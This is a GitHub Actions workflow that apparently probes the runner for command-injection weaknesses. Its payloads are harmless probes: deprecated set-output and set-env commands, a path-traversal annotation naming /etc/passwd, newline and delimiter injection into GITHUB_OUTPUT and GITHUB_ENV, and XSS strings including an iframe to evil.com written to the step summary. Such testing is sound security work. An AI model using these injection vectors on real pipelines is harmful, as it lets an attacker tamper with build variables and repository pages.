name: "Sub-1112 Workflow Command Injection Test"

on:
  workflow_dispatch:
    inputs:
      test_vector:
        description: "Test vector identifier"
        required: true
        default: "all"

jobs:
  test-command-injection:
    runs-on: ubuntu-latest
    steps:
      - name: "V1 - Test deprecated set-output"
        id: v1_setoutput
        run: |
          echo "=== VECTOR 1: Deprecated set-output ==="
          echo "::set-output name=v1_test::INJECTED_VALUE_V1"
          echo "v1_result=tested" >> "$GITHUB_OUTPUT"

      - name: "V1 - Verify"
        run: |
          echo "V1 deprecated: [${{ steps.v1_setoutput.outputs.v1_test }}]"
          echo "V1 file-based: [${{ steps.v1_setoutput.outputs.v1_result }}]"

      - name: "V2 - Test add-mask injection"
        run: |
          echo "=== VECTOR 2: add-mask ==="
          echo "BEFORE_MASK_SECRETTOKEN"
          echo "::add-mask::SECRETTOKEN"
          echo "AFTER_MASK_SECRETTOKEN"

      - name: "V3 - Test deprecated set-env"
        run: |
          echo "=== VECTOR 3: set-env ==="
          echo "::set-env name=V3_INJECTED::EVIL_VALUE"

      - name: "V3 - Verify"
        run: |
          echo "V3 env: [$V3_INJECTED]"

      - name: "V4 - Test save-state"
        id: v4_state
        run: |
          echo "=== VECTOR 4: save-state ==="
          echo "::save-state name=v4_test::STATE_INJECTED"

      - name: "V5 - Test annotations"
        run: |
          echo "=== VECTOR 5: annotations ==="
          echo "::warning file=app.js,line=1::Injected warning"
          echo "::error file=app.js,line=2::Injected error"
          echo "::notice file=app.js,line=3::Injected notice"
          echo "::error file=../../../etc/passwd,line=1::Path traversal"

      - name: "V6 - Test GITHUB_OUTPUT delimiter"
        id: v6_delim
        run: |
          echo "=== VECTOR 6: delimiter manipulation ==="
          echo "v6_normal=safe_value" >> "$GITHUB_OUTPUT"
          printf 'v6_inject<<EOF\ninjected\nEOF\nv6_evil=EVIL' >> "$GITHUB_OUTPUT"

      - name: "V6 - Verify"
        run: |
          echo "V6 normal: [${{ steps.v6_delim.outputs.v6_normal }}]"
          echo "V6 inject: [${{ steps.v6_delim.outputs.v6_inject }}]"
          echo "V6 evil: [${{ steps.v6_delim.outputs.v6_evil }}]"

      - name: "V7 - Test step summary HTML"
        run: |
          echo "## Test Summary" >> "$GITHUB_STEP_SUMMARY"
          echo "<script>alert(1)</script>" >> "$GITHUB_STEP_SUMMARY"
          echo "<img src=x onerror=alert(1)>" >> "$GITHUB_STEP_SUMMARY"
          echo "<svg onload=alert(1)>" >> "$GITHUB_STEP_SUMMARY"
          echo "<iframe src=https://evil.com></iframe>" >> "$GITHUB_STEP_SUMMARY"
          echo "<details><summary>Expand</summary>Content</details>" >> "$GITHUB_STEP_SUMMARY"
          echo "End of test" >> "$GITHUB_STEP_SUMMARY"

      - name: "V6b - Test GITHUB_ENV newline injection"
        run: |
          echo "V6B_SAFE=safe_value" >> "$GITHUB_ENV"
          printf 'V6B_INJECT=inject\nV6B_EVIL=evil_injected' >> "$GITHUB_ENV"

      - name: "V6b - Verify"
        run: |
          echo "V6B_SAFE: [$V6B_SAFE]"
          echo "V6B_INJECT: [$V6B_INJECT]"
          echo "V6B_EVIL: [$V6B_EVIL]"

      - name: "Runner info"
        run: |
          echo "Runner: $RUNNER_OS $RUNNER_ARCH"
